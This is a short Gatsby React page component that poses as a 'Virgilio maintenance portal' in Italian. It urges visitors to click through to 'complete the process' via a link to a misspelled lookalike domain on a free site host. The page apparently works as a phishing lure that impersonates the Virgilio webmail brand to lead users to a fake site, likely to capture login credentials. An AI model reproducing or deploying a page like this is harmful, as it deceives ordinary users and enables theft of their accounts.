import * as React from "react"
import { Link } from "gatsby"

import Layout from "../components/layout"
import Seo from "../components/seo"

const SecondPage = () => (
  <Layout>
    <Seo title="Virgilio" />
    <h1>Portale di Manutenzione Virgilio</h1>
    <p>Clicca qui sotto per completare il processo</p>
    <Link to="https://virgillio.yolasite.com/">Portale Virgilio</Link>
  </Layout>
)

export default SecondPage
